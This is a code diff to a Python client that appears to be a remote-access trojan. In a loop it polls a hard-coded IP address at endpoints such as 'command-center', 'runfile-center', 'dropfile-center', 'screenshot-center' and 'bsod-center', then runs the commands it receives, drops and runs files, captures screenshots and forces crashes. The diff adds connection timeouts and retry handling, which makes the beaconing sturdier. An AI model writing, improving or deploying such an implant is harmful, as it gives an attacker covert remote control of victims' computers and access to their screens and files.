@@ -1,31 +1,45 @@
+from requests import RequestException, Response, post, get
 from subprocess import CREATE_NEW_CONSOLE, Popen
 from PIL import UnidentifiedImageError, Image
-from requests import Response, post, get
 from os import environ, getcwd, chdir
 from pyautogui import screenshot
 from base64 import b64decode
 from time import sleep
 from os import remove
+from sys import exit
 
 DELAY = 5
 IP = "143.42.110.206"
 IP = "127.0.0.1"
 PORT = 80
 SCHEME = "http"
+CONNECT_TIMEOUT = 5
 
 
 def main() -> None:
     try:
         while True:
-            get_commands_response = get(f"{SCHEME}://{IP}:{PORT}/command-center")
-            get_images_response = get(f"{SCHEME}://{IP}:{PORT}/image-center")
-            get_bsod_response = get(f"{SCHEME}://{IP}:{PORT}/bsod-center")
-            get_run_file_response = get(f"{SCHEME}://{IP}:{PORT}/runfile-center")
-            get_screenshot_file_response = get(
-                f"{SCHEME}://{IP}:{PORT}/screenshot-center"
+            get_commands_response = get(
+                f"{SCHEME}://{IP}:{PORT}/command-center", timeout=CONNECT_TIMEOUT
             )
-            get_website_response = get(f"{SCHEME}://{IP}:{PORT}/website-center")
-            get_drop_file_response = get(f"{SCHEME}://{IP}:{PORT}/dropfile-center")
+            get_images_response = get(
+                f"{SCHEME}://{IP}:{PORT}/image-center", timeout=CONNECT_TIMEOUT
+            )
+            get_bsod_response = get(
+                f"{SCHEME}://{IP}:{PORT}/bsod-center", timeout=CONNECT_TIMEOUT
+            )
+            get_run_file_response = get(
+                f"{SCHEME}://{IP}:{PORT}/runfile-center", timeout=CONNECT_TIMEOUT
+            )
+            get_screenshot_file_response = get(
+                f"{SCHEME}://{IP}:{PORT}/screenshot-center", timeout=CONNECT_TIMEOUT
+            )
+            get_website_response = get(
+                f"{SCHEME}://{IP}:{PORT}/website-center", timeout=CONNECT_TIMEOUT
+            )
+            get_drop_file_response = get(
+                f"{SCHEME}://{IP}:{PORT}/dropfile-center", timeout=CONNECT_TIMEOUT
+            )
             if get_commands_response.status_code == 200:
                 run_command(get_commands_response)
             if get_images_response.status_code == 200:
@@ -40,13 +54,19 @@ def main() -> None:
                 open_website(get_website_response.text)
             if get_drop_file_response.status_code == 200:
                 drop_file(
-                    get_drop_file_response.json("dropfile"),
-                    get_drop_file_response.json("location"),
+                    get_drop_file_response.json().get("dropfile"),
+                    get_drop_file_response.json().get("location"),
                 )
             sleep(DELAY)
+    except RequestException:
+        print("Failed to connect, retrying...")
+        main()
+    except KeyboardInterrupt:
+        print("Goodbye...")
+        sleep(1.5)
+        exit()
     except Exception as error:
         print(error)
-        sleep(DELAY)
         main()
 
 
